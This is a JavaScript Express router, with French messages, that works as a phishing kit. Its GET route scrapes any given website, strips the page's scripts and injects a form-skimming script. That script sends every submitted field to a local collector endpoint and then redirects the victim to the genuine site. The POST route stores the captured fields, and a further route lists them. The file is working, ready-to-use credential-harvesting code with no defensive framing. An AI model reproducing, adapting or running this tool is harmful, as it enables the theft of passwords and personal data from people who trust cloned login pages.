import express from "express";
import fs from "fs";
import path from "path";
import axios from "axios";
import {fileURLToPath} from "url";
import url from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const router = express.Router();

const SUBMISSIONS_FILE = path.join(__dirname, '..', 'phishing', 'submissions.json');

const getDomainName = (urlStr) => {
    const parsedUrl = new url.URL(urlStr);
    return parsedUrl.hostname.replace(/^www\./, ''); // On supprime "www"
};

router.get('/', async (req, res) => {
    const { url : siteUrl }  = req.query;
    if (!siteUrl) {
        return res.status(400).send("L'URL est requise");
    }

    try {
        
        const response = await axios.get(siteUrl);
        let referenceContent = response.data;

        const domainName = getDomainName(siteUrl);

        const phishingDir = path.join(__dirname, '..', 'phishing');

        if (!fs.existsSync(phishingDir)) {
            fs.mkdirSync(phishingDir, { recursive: true });
        }

        const TEMP_HTML_FILE = path.join(phishingDir, `${domainName}.html`);

        referenceContent = referenceContent.replace(/<script[^>]*>([\S\s]*?)<\/script>/g, '');

        const script = `
                <script>
                    document.addEventListener("DOMContentLoaded", function () {
                    const checkForm = () => {
                        const form = document.querySelector("form");
                
                        if (form) {
                            form.addEventListener("submit", async function (event) {
                                event.preventDefault();
                
                                const formData = new FormData(form);
                                const data = {};
                                data.site = "${siteUrl}";
                                formData.forEach((value, key) => {
                                    data[key] = value;
                                });
                                console.log(JSON.stringify(data))
                
                                try {
                                    const response = await fetch("http://localhost:3000/phishing/", {
                                        method: "POST",
                                        headers: {
                                            "Content-Type": "application/json",
                                        },
                                        body: JSON.stringify(data)
                                    });
                
                                    const result = await response.json();
                                    console.log("Données reçues :", result);
                                    window.location.href = "${siteUrl}";
                                } catch (error) {
                                    console.error("Erreur :", error);
                                }
                            });
                        } else {
                            console.log("Formulaire introuvable");
                        }
                    };
                    checkForm();
                });
                </script>
            `;

        referenceContent = referenceContent.replace(/<\/body>/, script + '</body>');

        fs.writeFileSync(TEMP_HTML_FILE, referenceContent);

        res.send({
            message: `Fichier HTML généré avec succès ! Vous pouvez l'ouvrir à cet emplacement : ${TEMP_HTML_FILE}`,
            info: `Vous pourrez retrouver toutes les informations à cette requête : http://localhost:4000/features/phishing-service/subimissions`
        });

    } catch (error) {
        console.error("Erreur lors du scraping du site :", error);
        res.status(500).send("Erreur lors du scraping du site");
    }
});

router.post('/', async (req, res) => {
    try {
        const formData = {};
        for (const [key, value] of Object.entries(req.body)) {
            formData[key] = value;
        }

        if (Object.keys(formData).length === 0) {
            return res.status(400).json({error: "Aucun champ valide trouvé dans le formulaire."});
        }

        let submissions = [];
        if (fs.existsSync(SUBMISSIONS_FILE)) {
            const data = fs.readFileSync(SUBMISSIONS_FILE, "utf8");
            try {
                submissions = JSON.parse(data);

                if (!Array.isArray(submissions)) {
                    console.warn("Le fichier JSON ne contient pas un tableau. Réinitialisation.");
                    submissions = [];
                }
            } catch (err) {
                console.error("Erreur lors du parsing du JSON :", err);
                submissions = [];
            }
        }

        const newSubmission = {...formData, timestamp: new Date()};
        submissions.push(newSubmission);

        fs.writeFileSync(SUBMISSIONS_FILE, JSON.stringify(submissions, null, 2));

        res.status(200).json({
            message: "Données reçues avec succès !",
            submission: newSubmission,
        });
    } catch (error) {
        console.error("Erreur lors du traitement des données :", error);
        res.status(500).json({error: "Une erreur est survenue lors de la soumission."});
    }
});

router.get('/submissions', async (req, res) => {
    try {
        if (!fs.existsSync(SUBMISSIONS_FILE)) {
            return res.status(404).json({message: "Aucune soumission trouvée."});
        }

        const data = fs.readFileSync(SUBMISSIONS_FILE, "utf8");
        const submissions = JSON.parse(data);

        res.status(200).json(submissions);
    } catch (error) {
        console.error("Erreur lors de la récupération des données :", error);
        res.status(500).json({error: "Une erreur est survenue lors de la récupération des données."});
    }
});

export default router;
